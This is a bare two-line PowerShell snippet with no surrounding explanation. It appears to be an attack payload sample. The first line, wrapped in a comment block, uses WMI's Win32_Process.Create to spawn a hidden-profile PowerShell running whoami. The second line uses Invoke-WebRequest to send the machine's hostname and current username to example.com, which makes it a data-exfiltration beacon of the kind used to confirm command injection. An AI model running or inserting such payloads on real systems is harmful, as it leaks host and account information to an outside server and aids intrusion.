<#([WmiClass]'Win32_Process').Create('powershell -NoE -NoP whoami');#>
iwr ("example.com/{0}:{1}" -f (hostname),(whoami))